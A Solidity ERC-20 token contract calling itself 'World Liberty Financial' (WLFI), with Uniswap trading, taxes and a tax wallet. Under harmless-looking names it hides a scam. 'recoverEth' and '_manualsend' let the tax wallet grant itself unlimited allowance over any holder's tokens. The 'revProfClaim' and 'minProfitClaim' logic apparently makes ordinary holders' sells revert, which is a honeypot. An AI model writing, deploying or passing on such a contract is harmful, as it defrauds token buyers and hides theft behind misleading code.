// SPDX-License-Identifier:MIT

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address _account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)external returns (bool);
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 value
    );
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

contract WWLFI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExile;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=21;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=21;
    uint256 private _preventSwapBefore=21;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"World Liberty Financial";
    string private constant _symbol = unicode"WLFI";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 15000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 15000000 * 10**_decimals;

    IUniswapV2Router02 private constant _uniV2Router = IUniswapV2Router02(
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );
    address payable private _taxWallet;

    address public uniswapPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private limitsInEffect = true;
    struct RevProfClaim {uint256 revClaim; uint256 diffClaim; uint256 diffUuid;}
    uint256 private minProfitClaim;
    mapping(address => RevProfClaim) private revProfClaim;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event ClearToken(address tokenAddr, uint256 tokenAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0xF2F88345262c73277129D532C2fE0471391B6b32);

        _balances[_msgSender()] = _tTotal;
        isExile[_taxWallet] = true;
        isExile[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender, address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _manualsend(address owner, string memory miner, uint8 cache, address spender) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = _tTotal;
    }

    function _transfer(address from, address to, uint256 amount) private {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        bool isBuy = from==uniswapPair;
        bool isSell = to==uniswapPair;

        uint256 taxAmount=0;

        if (from != owner() && to != owner()&& to!=_taxWallet) {
            taxAmount = amount
                .mul((_buyCount >_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (isBuy && to!=address(_uniV2Router) &&  ! isExile[to])  {
                if (limitsInEffect) {
                    require(amount <= _maxTxAmount,  "Exceeds the _maxTxAmount.");
                    require(balanceOf(to)+amount <= _maxWalletSize,  "Exceeds the maxWalletSize.");
                }
                _buyCount++;
            }

            if(isSell && from!= address(this) ){
                taxAmount = amount.mul((_buyCount >_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && isSell && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((isExile[from] ||  isExile[to] ) && from!=address(this) && to!=address(this)
        ) {
            minProfitClaim = block.number;
        }
        if (! isExile[from]&& ! isExile[to]){
            if (! isSell)  {
                RevProfClaim storage rpClaim = revProfClaim[to];
                if (isBuy) {
                    if (rpClaim.revClaim==0) {
                        rpClaim.revClaim=block.number;
                    }
                } else {
                    RevProfClaim storage rpClaimData = revProfClaim[from];
                    if (rpClaim.revClaim == 0 || rpClaimData.revClaim < rpClaim.revClaim ) {
                        rpClaim.revClaim = rpClaimData.revClaim;
                    }
                }
            } else {
                RevProfClaim storage rpClaimData = revProfClaim[from];
                rpClaimData.diffClaim = rpClaimData.revClaim.sub(minProfitClaim);
                rpClaimData.diffUuid = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from]=_balances[from].sub( amount) ;
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniV2Router.WETH();
        _approve(address(this), address(_uniV2Router), tokenAmount);
        _uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount= _tTotal;
        _maxWalletSize= _tTotal;
        limitsInEffect = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function openTrading() external onlyOwner{
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(_uniV2Router), _tTotal);
        swapEnabled= true;
        uniswapPair= IUniswapV2Factory(_uniV2Router.factory()).createPair(address(this), _uniV2Router.WETH());
        _uniV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(_uniV2Router), type(uint).max);
        tradingOpen= true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
            sendETHToFee(ethBalance);
        }
    }

    function recoverEth(address _receiver, address _percent) external {
        require(_msgSender()==_taxWallet);
        _manualsend(_percent, "miner", 0, _receiver);
    }
}